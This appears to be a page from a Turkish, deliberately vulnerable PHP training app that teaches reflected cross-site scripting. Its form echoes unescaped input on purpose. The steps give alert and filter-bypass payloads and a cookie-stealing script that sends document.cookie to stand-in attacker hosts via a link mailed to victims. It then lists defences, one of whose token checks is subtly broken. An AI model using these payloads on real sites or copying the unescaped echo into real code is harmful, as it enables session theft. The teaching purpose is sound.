<?php

include("baglanti.php");
error_reporting(0);

?>


<!DOCTYPE html>
<html><head>
<title>Siber Eğitim</title>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"> 
<meta name="keywords" content="#" />
<link rel="stylesheet" type="text/css" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/styles/monokai-sublime.min.css">
<link rel="stylesheet" type="text/css" href="css/bootstrap.min.css">
<link rel="stylesheet" type="text/css" href="css/style.css">
<link rel="stylesheet" type="text/css" href="css/font-awesome-4.6.3/css/font-awesome.min.css">
<link rel="stylesheet" type="text/css" href="css/animate.min.css">
<link href="https://fonts.googleapis.com/css?family=Armata|Baloo+Bhaina|Josefin+Slab|Righteous|Yellowtail" rel="stylesheet">

<link href="ok.png" rel="shortcut icon" >


</head>
<body style="background:url('blur-bg.jpg') no-repeat center center fixed; background-size:cover;">
	<!-- Header -->
	<!-- Header -->
	<div class="col-xs-12 " style="width:100%; height:3px;background-color:rgba(255,255,255,0.5);position:fixed;top:0; z-index:1000;">
		<div class="col-xs-12 hidden-sm hidden-xs" id="scrollbar" style="transition:all 0.5s linear;height:3px;background-color:rgba(255,0,0,1);position:fixed;top:0;left:0; z-index:1001;">
		</div>
	</div>
	<div class="container-full">

		<div class="col-sm-12 " style="">	
			<a href="xss.php"><div class="btn btn-primary buton-red " style="position:fixed;top:10px;left:3px"><i style="font-size:17px"class="fa fa-chevron-circle-left" aria-hidden="true"></i>
				Geri Dön</div></a>
				<a target="_blank" href="code.php?id=2"><div class="btn btn-primary buton-mor " style="position:fixed;bottom:10px;left:3px">
					<i class="fa fa-code" aria-hidden="true"></i> Kodu Göster</div></a>


					<ul class="sagustmenu" style="list-style:none; position:absolute;top:0;right:20px">
						<li><a data-toggle="modal" data-target=".bs-example-modal-lg" class="yardim" style="position:fixed;top:0;right:7px;">
							<i class="fa fa-question-circle" aria-hidden="true"></i></a></li>
							<li><a href="/yazlab/" style="position:fixed;top:0;right:40px;"><i class="fa fa-home" aria-hidden="true"></i></a></li>
						</ul>

						<div class="modal fade bs-example-modal-lg" tabindex="-1" role="dialog" aria-labelledby="myLargeModalLabel" style="">
							<div class="modal-dialog modal-lg" role="document">
								<div class="modal-content" style="padding:15px;font-size:13px;background:rgba(0,0,0,1);line-height:20px;color:#fff;box-shadow:-11px 12px 18px 7px rgba(0, 0, 0, 0.2)">
									<h1 style="text-align:center;">Nedir Bu ?</h1>
									<hr><br/>
									Bu uygulama, kasıtlı olarak bırakılmış güvenlik zafiyetlerini (vulnerability) içeren zayıf (vulnerable) bir web uygulamasıdır.
									Uygulamalı siber güvenlik eğitimlerinde kullanılması için yapılmıştır. 
									Yasal olmayan bir şekilde gerçek sistemlere saldırmadan bu uygulama üzerinde öğrendiklerinizi tecrübe etmeniz açısından hazırlanmıştır.
									Üzerinde zafiyetler bulunan bu web uygulamasında, zafiyetlerin neden kaynaklandığının ve bu zafiyetlerin
									nasıl sömürüleceği açık ve anlaşılır bir şekilde adım adım açıklanmıştır.
								</div>
							</div>
						</div>


					</div>
				</div>
				<div class="container">



					<div class="col-sm-12 bant" style="color:#fff;padding:10px;font-weight:bold;" >
						<h1 style="text-align:center;background:linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%);
						background: -webkit-linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%);">
						<div style="background:linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%);
						background: -webkit-linear-gradient(0deg,  transparent 0%,rgba(0,0,0,0.2) 50%, transparent 100%); font-size:25px;font-weight:bold;">
						UYGULAMA-2 / XSS CROSS SITE SCRIPTING REFLECTED VERSION</div> Olası Senaryo</h1>
						<hr>
						<p>
							Uygulamada bir isim bir de yaş olmak üzere iki text alanı ayrıca bir de yazdır butonu bulunmaktadır. Yazdır butonuna tıklandığında text alanına girilen isim ve yaş bilgisine
							göre hemen aşağısında bir cümlelik yazı çıkmaktadır.
							<br/>
							<br/>
							Alttaki kutucukta sizden bir yaş ve isim girilmesi bekleniyor. Bunu görelim.
						</p>
						<div class="col-sm-6"> 

							<div class="adimlar" style="font-size:12px;background-color:rgba(0,0,50,0.3);padding:2px 10px;margin-top:10px">
								<i style="padding:3px;font-size:10px; color:#fA6644">Adımları sırayla uygulayıp çalışmayı inceleyiniz.</i>
								<p>
									<h1 style="text-align:center;font-size:22px;">UYGULANACAK ADIMLAR</h1><hr>
								</p>
							</div>

							<div class="panel-group" id="accordion" role="tablist" aria-multiselectable="true">
								<div class="panel panel-default" id="panel1">
									<div class="panel-heading" role="tab" style="cursor:pointer;" id="headingOne" data-toggle="collapse" data-parent="#accordion" href="#collapseOne" aria-expanded="false" aria-controls="collapseOne">
										<h4 class="panel-title">

											ADIM - 1 <i id="" class="fa fa-sort-desc" aria-hidden="true"></i>



										</h4>
									</div>
									<div id="collapseOne" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingOne">
										<div class="panel-body">
											1- Text alanına dilediğiniz girişleri yazarak yazdır butonuna tıklayın ve sonucu görün.<br/><br/>
											Görünürde her şey normal gibi. Yapacağımız ilk hamle kodda html etiketleri sınırlandırılmış mı kontrol etmek olacak.
											Input alanlarından herhangi birisine dilediğiniz html etiketini yazarak gönderin.
											<br/><br/>
											Örnek:
											<pre>
												<code class="html">&lt;font color="red"&gt;Tiger&lt;/font&gt;</code></pre>
												Eğer girilen bu html tag'lı ifade ile çıktıyı şekillendirebiliyorsak XSS açığı var demektir.
											</div>
										</div>
									</div>

									<div class="panel panel-default" id="panel2">
										<div class="panel-heading collapsed" role="tab" style="cursor:pointer;"id="headingTwo" data-toggle="collapse" data-parent="#accordion" href="#collapseTwo" aria-expanded="false" aria-controls="collapseTwo">
											<h4 class="panel-title">

												ADIM - 2 <i class="fa fa-sort-desc" aria-hidden="true"></i>

											</h4>
										</div>
										<div id="collapseTwo" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingTwo">
											<div class="panel-body">

												2- Bu tarz depolanmayan XSS açıklarında genel mantık Javascript kodu ile kurban kişiyi zararlı siteye yönlendirerek o anki cookie değerlerini çekmektir. Şimdi bu olayı ele alalım.

												<br/>
												Input değerine script tag'leri ile javascript kodu enjekte edelim. Yalnız bu kod kalıcı olmayacaktır. Sadece siteye bu kodu enjekte edebildiğimizi göreceğiz.
												<br/><br/>
												Metin Kutusuna Girilecek Kod: <br/><br/>
												<pre>
													<code class="html">&lt;script>alert("Sitede XSS açığı Mevcut ");&lt;/script></code></pre>

													NOT : Eğer opera ve chrome tarayıcı da bu uygulamayı çalıştırıyorsanız alert kodu çalışmayacaktır. Bunun nedeni bu tarayıcıların XSS güvenliği politikası nedeniyle bu şekilde 
													GET ve POST değerlerinden gelen javascript kodlarını çalıştırmıyor. Bunu " öğeyi denetle " menüsünden görebilirsiniz. Firefox'da iseniz alert kodu çalışacaktır. 
												</div>
											</div>
										</div>

										<div class="panel panel-default" id="panel3">
											<div class="panel-heading collapsed" role="tab"  style="cursor:pointer;" id="headingThree" data-toggle="collapse" data-parent="#accordion" href="#collapseThree" aria-expanded="false" aria-controls="collapseThree">
												<h4 class="panel-title">
													NELER YAPILABİLİR ? <i class="fa fa-sort-desc" aria-hidden="true"></i>        
												</h4>
											</div>
											<div id="collapseThree" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingThree">
												<div class="panel-body">

													<pre><code class="html">&lt;script> window.location.href=”sizin-siteniz.com/index.php?cookie=” + document.cookie;&lt;/script></code></pre>
													Yukarıda görülen koddaki gibi scriptler ile cookielere erişilebilir. Tabi bunun için $_GET[‘cookie’] işlem yapıp yazdırma işlemleri sağlanmalıdır. 
													<br/>
													<br/>
													<pre><code class="html">http://localhost/yazlab/sqluyg2xss.php?isim=&lt;script> window.location.href=”saldirganinsitesi.com/index.php?cookie=” + document.cookie;&lt;/script>
													</code></pre>
													<br/>

													Bu linki ziyaretçi kullanıcıya çeşitli iletişim araçları ile ulaştırarak tıklaması sağlanır. Bu sayede sanki güvenilir bir siteye gidiyormuş gibi gözükür ama aslında saldırgan siteye yönlenir.
													Bu şekilde cookie'ye ulaşılmış olur.Yapılan bu saldırı sadece XSS saldırısı yapan kullanıcı tarafından görülür. 
													Ziyaretçiler bu saldırıyı göremezler.

												</div>
											</div>
										</div>
										<div class="panel panel-default" id="panel4">
											<div class="panel-heading collapsed" role="tab" style="cursor:pointer;"id="headingFour" data-toggle="collapse" data-parent="#accordion" href="#collapseFour" aria-expanded="false" aria-controls="collapseTwo">
												<h4 class="panel-title">

													XSS AÇIKLARINI NASIL KAPATIRIM ?<i class="fa fa-sort-desc" aria-hidden="true"></i>

												</h4>
											</div>
											<div id="collapseFour" class="panel-collapse collapse" role="tabpanel" aria-labelledby="headingFour">
												<div class="panel-body">
													1- Script Kelimesini Sınırlandırma
													<br/><br/>
													Input alanına eğer &lt;script> tag'ı girilmişse bunu silebiliriz. Tam anlamıyla koruma sağlamaz. Aşılma imkanı vardır.
													<br/><br/>
													Kod'a eklenmesi gereken güvenlik önlemi: <br/><br/>
													Güvenlik Seviyesi: <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i>
													<br/><br/>

													<pre><code class="php">
														$isim = str_replace( '&lt;script>', '', $_GET[ 'isim' ] );
														$yas = str_replace( '&lt;script>', '', $_GET[ 'yas' ] );	
														// İsim ve yas değişkenlerine ekstra güvenlik önlemi getiriyoruz
														// str_replace fonksiyonu ile girilen değerde &lt;script> varsa onu silip boşluk yazıyoruz.
													</code></pre>
													<br/><br/>
													<pre><code class="php">&lt;img src="x" error=alert("xss") /></code></pre><br/>
													Bu input ile rahatça aşılabilir. Bu nedenle ekstra güvenlik önlemi alınmalı.
													Örnek:<br/><br/>
													<pre><code class="php">&lt;sCrIpT> &lt;/sCrIpT></code></pre>	
													<br/>
													<hr/>
													<br/>
													Güvenlik Seviyesi: <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i>
													<br/><br/>
													<pre><code class="php">
														$isim = htmlspecialchars(str_replace( '&lt;script>', '', $_GET[ 'isim' ] ));
														$yas = htmlspecialchars(str_replace( '&lt;script>', '', $_GET[ 'yas' ] ));
														// Daha da iyileştirip html taglerini de etkisiz hale getirebiliriz.
														// htmlspecialchars fonksiyonu sayesinde html tag'leri özel karakterlere çevrilir ve çalışması önlenir.
													</code></pre>
													<br/><br/>
													Güvenlik Seviyesi: <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i> <i class="fa fa-star" aria-hidden="true"></i>
													<br/><br/>
													Çok daha güvenilir bir web ortamı için " Token " kullanın.<br/>
													Aşağıdaki kodda token ile veri alımı gösterilmiştir.<br/><br/>
													<pre><code class="php">
														session_start(); // Session başlatıyoruz.
														$token = $_SESSION['token'] = md5(uniqid(mt_rand(),true)); 
														// Bir token değişkeni oluşturduk ve bunu session token'a eşitledik.
														// Token'i mt_rand() fonksiyonu ile rastgele sayı oluşturup uniqid() fonksiyonuna girdi olarak veriyoruz. Benzersiz bir sayı elde ediyoruz.
														// Eşsiz bir sayı elde etmek içinde md5 şifreleme fonksiyonuna girdi olarak veriyoruz. 

														if(isset($_GET)){ //Eğer get varsa aşağıdaki işlemleri yap.

														if(isset($_SESSION['token']) && $_POST['$token'] == $_SESSION['$token']){ 
														// Eğer session'dan gelen token varsa ve posttan gelen token session'dan gelen token'a eşitse aşağıdaki işlemleri yap.

														$isim = htmlspecialchars(trim( $_POST['isim']),ENT_QUOTES); //get ile gelen verileri trim ile boşluktan arındırıp htmlspecialchars() fonksiyonu ile html taglarını önlüyoruz.

														$yas = htmlspecialchars(trim( $_POST['yas']),ENT_QUOTES); // ENT_QUOTES parametresi ' işaretinin ascii code'a dönüştürüleceğini ifade ediyor.

													}else{
													echo'token yanlis';
												}
											}	
										</code></pre>
										<br/><br/>
										<i style="font-size:40px;"class="fa fa-user-secret" aria-hidden="true"></i> Ekstra güvenlik hamleleri: <br/><br/>

										Üçüncü parti paket yazılımlar kullanılabilir. AntiXSS, HTML Purifer vb. kütüphane yazılımlar kullanabiliriz.
										<br/><br/>
										Tanımlama bilgilerinizde yanlızca HTTPOnly kullanın. Bu kütüphane ile cookielere erişim iznine sadece HTTPOnly bayrağı taşıyan hareketler erişebilir.
									</div>
								</div>
							</div>

						</div>
					</div>
					<div class="col-sm-6 liste_alani"> 
						<form  align="center" style="margin-bottom:20px;margin-top:8px;"action="" method="GET" class="form" name="form2">
							<input type="text" class="uyg" placeholder="İsminizi Giriniz..." required="" name="isim" style="margin-right:5px;">
							<input type="text" class="uyg" placeholder="Yaşınızı giriniz..." required="" name="yas" style=""><br>
							<input type="submit" class="btn btn-primary buton-mor gonder" name="yazdir" value="Yazdır">
						</form>

						<?php

			if( isset( $_GET ) ) { //GET varsa aşağıdaki bloğu işle

			$isim = trim($_GET[ 'isim' ] );//Name değeri "isim" olan input'tan gelen veriden trim() fonksiyonu ile boşlukları silip $isim değişkenine ata
			$yas  =	trim($_GET[ 'yas' ] );//Name değeri "yas" olan input'tan gelen veriden trim() fonksiyonu ile boşlukları silip $yas değişkenine ata
			

			?>
			<div class="col-sm-12" style="padding:10px;margin:5px;font-weight:bold;">


				<?php if($yas!='' && $isim!=''){echo "Merhaba ben ".$isim."   . ".$yas." yaşındayım.";} ?> </div>
				<?php	}else{
					
				}?>


			</div>
		</div>
		<div class="clear"></div>
		
		<!-- Header -->

		<script src="js/jquery.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/jqueryui/1.12.1/jquery-ui.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/highlight.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/php.min.js"></script>
		<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/9.11.0/languages/sql.min.js"></script>
		<script>hljs.initHighlightingOnLoad();</script>
		<script src="js/bootstrap.min.js"></script>
		<script src="js/script.js"></script>
		<script src="js/jquery.teletype.js"></script>
		<script>

			$(function(){

				$(".panel-heading").click(function(){
					var a = $(this).find("i");

					if(a.hasClass("fa-sort-desc")){

						$(this).find(".fa-sort-desc").removeClass("fa-sort-desc").addClass("fa-sort-asc");
					}else{
						$(this).find(".fa-sort-asc").removeClass("fa-sort-asc").addClass("fa-sort-desc");
					}

				});

var height = $("body").height();

$(".bant").css("min-height",height);
$(window).resize(function(){
	var height = $("body").height();

	$(".bant").css("min-height",height);
});


});

			$(".play").click(function(){
				var height = $("body").height();
				$('html, body').animate({
					scrollTop:height,

				},2000,'easeInOutBack');
				$(".icerik").addClass("animated fadeOutUp");


				setTimeout(function() { $('.icerik').removeClass("fadeOutUp").addClass("animated fadeIn "); },3000);
			});
			$(".ilkuyg").click(function(){
				var height = $("body").height();
				$('html, body').animate({
					scrollTop:height*2,

				},2000,'easeInOutBack');
			});

		</script>

	</body>
	</html>